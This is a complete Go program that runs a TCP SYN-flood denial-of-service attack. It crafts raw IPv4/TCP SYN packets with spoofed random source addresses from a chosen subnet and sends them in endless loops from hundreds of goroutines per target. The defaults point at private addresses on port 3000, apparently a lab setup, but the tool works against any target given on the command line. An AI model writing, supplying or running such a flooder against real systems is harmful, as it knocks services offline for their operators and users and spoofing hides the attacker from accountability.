package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

var bufferPool = sync.Pool{
	New: func() any { return gopacket.NewSerializeBuffer() },
}

const (
	afINET     = 2
	sockRAW    = 3
	ipprotoRAW = 255
	ipprotoIP  = 0
	ipHDRINCL  = 3
)

func parseTargetIps(s string) []net.IP {
	var ips []net.IP
	for _, part := range strings.Split(s, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		ip := net.ParseIP(part)
		if ip != nil {
			ip = ip.To4()
			if ip != nil {
				ips = append(ips, ip)
			}
		}
	}
	return ips
}

func randomIpInSubnet(subnetCIDR string) (net.IP, error) {
	_, ipnet, err := net.ParseCIDR(subnetCIDR)
	if err != nil {
		return nil, err
	}
	base := ipnet.IP.To4()
	if base == nil {
		return nil, fmt.Errorf("IPv4 only")
	}
	ones, bits := ipnet.Mask.Size()
	hostBits := bits - ones
	if hostBits < 2 {
		return nil, fmt.Errorf("subnet too small for random hosts")
	}
	hostCount := (1 << hostBits) - 2
	offset := uint32(rand.Intn(hostCount) + 1)
	n := uint32(base[0])<<24 | uint32(base[1])<<16 | uint32(base[2])<<8 | uint32(base[3])
	mask := uint32(0xffffffff) << (32 - ones)
	networkNum := n & mask
	hostNum := networkNum + offset
	ip := make(net.IP, 4)
	ip[0] = byte(hostNum >> 24)
	ip[1] = byte(hostNum >> 16)
	ip[2] = byte(hostNum >> 8)
	ip[3] = byte(hostNum)
	return ip, nil
}

func main() {
	rand.Seed(time.Now().UnixNano())

	targetIpStr := flag.String("target-ip", "172.20.0.10,172.20.0.11", "Target IP addresses (comma-separated)")
	targetPortStr := flag.Int("target-port", 3000, "Target port")
	subnetStr := flag.String("subnet", "172.20.0.0/24", "Subnet for random source IPs (e.g. 172.20.0.0/24)")
	workers := flag.Int("workers", 500, "Number of parallel goroutines per target")

	flag.Parse()

	targetIps := parseTargetIps(*targetIpStr)
	if len(targetIps) == 0 {
		log.Fatalf("No valid target IPs")
	}

	_, _, err := net.ParseCIDR(*subnetStr)
	if err != nil {
		log.Fatalf("Invalid subnet: %v", err)
	}

	fd, err := syscall.Socket(afINET, sockRAW, ipprotoRAW)
	if err != nil {
		log.Fatalf("Failed to create raw socket (need root/CAP_NET_RAW): %v", err)
	}
	defer syscall.Close(fd)

	err = syscall.SetsockoptInt(fd, ipprotoIP, ipHDRINCL, 1)
	if err != nil {
		log.Fatalf("Failed to set IP_HDRINCL: %v", err)
	}

	targetPort := layers.TCPPort(*targetPortStr)
	fmt.Printf("Attacking %v:%d with random source IPs from %s (%d workers/target)\n", targetIps, targetPort, *subnetStr, *workers)
	fmt.Println("Press Ctrl+C to stop")

	for _, targetIp := range targetIps {
		var dst [4]byte
		copy(dst[:], targetIp)
		for i := 0; i < *workers; i++ {
			go func(tip net.IP, d [4]byte) {
				for {
					sourceIp, err := randomIpInSubnet(*subnetStr)
					if err != nil {
						continue
					}

					ipLayer := &layers.IPv4{
						SrcIP:    sourceIp,
						DstIP:    tip,
						Protocol: layers.IPProtocolTCP,
						Version:  4,
						TTL:      64,
					}

					tcpLayer := &layers.TCP{
						SrcPort: layers.TCPPort(rand.Intn(65535-1024) + 1024),
						DstPort: targetPort,
						SYN:     true,
						Seq:     rand.Uint32(),
						Window:  14600,
					}
					tcpLayer.SetNetworkLayerForChecksum(ipLayer)

					buffer := bufferPool.Get().(gopacket.SerializeBuffer)
					opts := gopacket.SerializeOptions{
						ComputeChecksums: true,
						FixLengths:       true,
					}
					err = gopacket.SerializeLayers(buffer, opts, ipLayer, tcpLayer)
					if err != nil {
						bufferPool.Put(buffer)
						continue
					}
					data := buffer.Bytes()
					_ = syscall.Sendto(fd, data, 0, &syscall.SockaddrInet4{Addr: d})
					bufferPool.Put(buffer)
				}
			}(targetIp, dst)
		}
	}

	select {}
}
